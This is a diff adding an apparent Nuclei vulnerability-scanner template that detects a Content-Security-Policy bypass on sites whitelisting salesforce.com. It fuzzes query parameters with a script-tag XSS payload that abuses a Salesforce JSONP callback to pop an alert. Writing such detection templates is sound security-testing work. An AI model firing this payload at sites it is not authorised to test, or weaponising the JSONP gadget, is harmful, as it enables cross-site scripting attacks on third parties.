@@ -1,0 +1,45 @@
+flow: http(1) && headless(1)
+headless:
+- fuzzing:
+  - fuzz:
+    - '{{url_encode(injection)}}'
+    mode: single
+    part: query
+    type: replace
+  matchers:
+  - dsl:
+    - salesforce_csp_xss == true
+    type: dsl
+  payloads:
+    injection:
+    - <script src="https://omtr2.partners.salesforce.com/id?callback=alert"></script>
+  steps:
+  - action: navigate
+    args:
+      url: '{{BaseURL}}'
+  - action: waitdialog
+    args:
+      max-duration: 5s
+    name: salesforce_csp_xss
+http:
+- matchers:
+  - condition: and
+    internal: true
+    part: header
+    type: word
+    words:
+    - Content-Security-Policy
+    - salesforce.com
+  method: GET
+  path:
+  - '{{BaseURL}}'
+id: salesforce-csp-bypass
+info:
+  author: Jaenact
+  metadata:
+    verified: true
+  name: Content-Security-Policy Bypass - salesforce
+  reference:
+  - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  severity: medium
+  tags: xss,csp-bypass,salesforce-api,vuln
